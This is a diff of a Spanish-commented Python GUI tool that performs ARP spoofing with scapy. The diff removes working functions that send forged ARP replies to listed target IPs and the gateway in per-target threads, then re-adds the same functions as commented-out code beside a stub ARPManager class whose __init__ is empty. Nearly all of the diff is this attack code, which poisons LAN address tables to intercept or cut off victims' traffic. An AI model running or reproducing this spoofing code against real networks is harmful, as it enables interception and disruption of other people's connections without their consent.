@@ -47,100 +47,117 @@ def extraer_ips(texto: str) -> list[str]:
     ips_encontradas = re.findall(patron, texto)
     return [ip for ip in ips_encontradas if validar_ip(ip)]
 
-# ===============================
 # Funcionalidad de ARP Spoofing
-# ===============================
-# Variables globales para ARP Spoofing
-ip_puerta_enlace = None
-mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
-ataque_en_curso = False
 
-def obtener_mac(ip):
+class ARPManager:
     """
-    Obtiene la dirección MAC de un dispositivo dado su IP mediante un paquete ARP.
+    Gestiona las operaciones del ataque
     """
-    solicitud_arp = ARP(pdst=ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    paquete = ether / solicitud_arp
-    resultado = srp(paquete, timeout=2, verbose=0)[0]
-    for enviado, recibido in resultado:
-        return recibido.hwsrc
-    return None
-
-def spoofing_arp(ip_objetivo):
-    """
-    Ejecuta el ARP spoofing enviando paquetes falsificados al objetivo y a la puerta de enlace.
-    """
-    global ataque_en_curso
-    mac_objetivo = obtener_mac(ip_objetivo)
-    if not mac_objetivo:
-        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.\n")
-        widget_salida.see(tk.END)
-        return
-
-    widget_salida.insert(tk.END, f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
-    widget_salida.see(tk.END)
     
-    try:
-        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
-        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)
-        while ataque_en_curso:
-            send(respuesta_arp_objetivo, verbose=0)
-            send(respuesta_arp_puerta, verbose=0)
-            widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
-            widget_salida.see(tk.END)
-            time.sleep(2)
-    except Exception as e:
-        widget_salida.insert(tk.END, f"Ocurrió un error en {ip_objetivo}: {e}\n")
-        widget_salida.see(tk.END)
-        restaurar_conexion(ip_objetivo)
+    def __init__(self, output_widget):
+        """
+        Inicializa el gestor de arp
+        """
+        
+    def _obtener_mac_local(self) -> str:
+        """
+        Obtiene la dirección MAC de la interfaz local
+        """
+        mac = uuid.getnode()
+        mac_str = ':'.join(['{:02x}'.format((mac >> i) & 0xff) 
+                           for i in range(0, 8*6, 8)][::-1])
+        return mac_str
 
-def restaurar_conexion(ip_objetivo):
-    """
-    Intenta restaurar la conexión enviando paquetes ARP correctos al objetivo y a la puerta de enlace.
-    """
-    mac_objetivo = obtener_mac(ip_objetivo)
-    mac_puerta = obtener_mac(ip_puerta_enlace)
-    if mac_objetivo and mac_puerta:
-        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
-        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
-        send(respuesta_arp_objetivo, count=5, verbose=0)
-        send(respuesta_arp_puerta, count=5, verbose=0)
-        widget_salida.insert(tk.END, "Conexión restaurada.\n")
-        widget_salida.see(tk.END)
-    else:
-        widget_salida.insert(tk.END, "No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.\n")
-        widget_salida.see(tk.END)
+# ip_puerta_enlace = None
+# mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
+# ataque_en_curso = False
 
-def iniciar_spoofing():
-    """
-    Inicia el ataque ARP spoofing leyendo la lista de IPs objetivo y creando un hilo por cada una.
-    """
-    global ataque_en_curso
-    ips_str = entrada_ips.get("1.0", tk.END)
-    lista_ips = [ip.strip() for ip in ips_str.splitlines() if ip.strip()]
-    if lista_ips:
-        widget_salida.delete("1.0", tk.END)
-        ataque_en_curso = True  
-        for ip in lista_ips:
-            hilo = threading.Thread(target=spoofing_arp, args=(ip,), daemon=True)
-            hilo.start()
+# def obtener_mac(ip):
+#     """
+#     Obtiene la dirección MAC de un dispositivo dado su IP mediante un paquete ARP.
+#     """
+#     solicitud_arp = ARP(pdst=ip)
+#     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+#     paquete = ether / solicitud_arp
+#     resultado = srp(paquete, timeout=2, verbose=0)[0]
+#     for enviado, recibido in resultado:
+#         return recibido.hwsrc
+#     return None
 
-def detener_spoofing():
-    """
-    Detiene el ataque ARP spoofing.
-    """
-    global ataque_en_curso
-    ataque_en_curso = False  
-    widget_salida.insert(tk.END, "Ataque cancelado.\n")
-    widget_salida.see(tk.END)  
+# def spoofing_arp(ip_objetivo):
+#     """
+#     Ejecuta el ARP spoofing enviando paquetes falsificados al objetivo y a la puerta de enlace.
+#     """
+#     global ataque_en_curso
+#     mac_objetivo = obtener_mac(ip_objetivo)
+#     if not mac_objetivo:
+#         widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.\n")
+#         widget_salida.see(tk.END)
+#         return
 
-def obtener_puerta_enlace():
-    """
-    Obtiene la IP de la puerta de enlace por defecto.
-    """
-    gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
-    return gateway
+#     widget_salida.insert(tk.END, f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
+#     widget_salida.see(tk.END)
+    
+#     try:
+#         respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
+#         respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)
+#         while ataque_en_curso:
+#             send(respuesta_arp_objetivo, verbose=0)
+#             send(respuesta_arp_puerta, verbose=0)
+#             widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
+#             widget_salida.see(tk.END)
+#             time.sleep(2)
+#     except Exception as e:
+#         widget_salida.insert(tk.END, f"Ocurrió un error en {ip_objetivo}: {e}\n")
+#         widget_salida.see(tk.END)
+#         restaurar_conexion(ip_objetivo)
+
+# def restaurar_conexion(ip_objetivo):
+#     """
+#     Intenta restaurar la conexión enviando paquetes ARP correctos al objetivo y a la puerta de enlace.
+#     """
+#     mac_objetivo = obtener_mac(ip_objetivo)
+#     mac_puerta = obtener_mac(ip_puerta_enlace)
+#     if mac_objetivo and mac_puerta:
+#         respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
+#         respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
+#         send(respuesta_arp_objetivo, count=5, verbose=0)
+#         send(respuesta_arp_puerta, count=5, verbose=0)
+#         widget_salida.insert(tk.END, "Conexión restaurada.\n")
+#         widget_salida.see(tk.END)
+#     else:
+#         widget_salida.insert(tk.END, "No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.\n")
+#         widget_salida.see(tk.END)
+
+# def iniciar_spoofing():
+#     """
+#     Inicia el ataque ARP spoofing leyendo la lista de IPs objetivo y creando un hilo por cada una.
+#     """
+#     global ataque_en_curso
+#     ips_str = entrada_ips.get("1.0", tk.END)
+#     lista_ips = [ip.strip() for ip in ips_str.splitlines() if ip.strip()]
+#     if lista_ips:
+#         widget_salida.delete("1.0", tk.END)
+#         ataque_en_curso = True  
+#         for ip in lista_ips:
+#             hilo = threading.Thread(target=spoofing_arp, args=(ip,), daemon=True)
+#             hilo.start()
+
+# def detener_spoofing():
+#     """
+#     Detiene el ataque ARP spoofing.
+#     """
+#     global ataque_en_curso
+#     ataque_en_curso = False  
+#     widget_salida.insert(tk.END, "Ataque cancelado.\n")
+#     widget_salida.see(tk.END)  
+
+# def obtener_puerta_enlace():
+#     """
+#     Obtiene la IP de la puerta de enlace por defecto.
+#     """
+#     gateway = os.popen("ip route | grep default | awk '{print $3}'").read().strip()
+#     return gateway
 
 # Creación de la Interfaz Gráfica
 
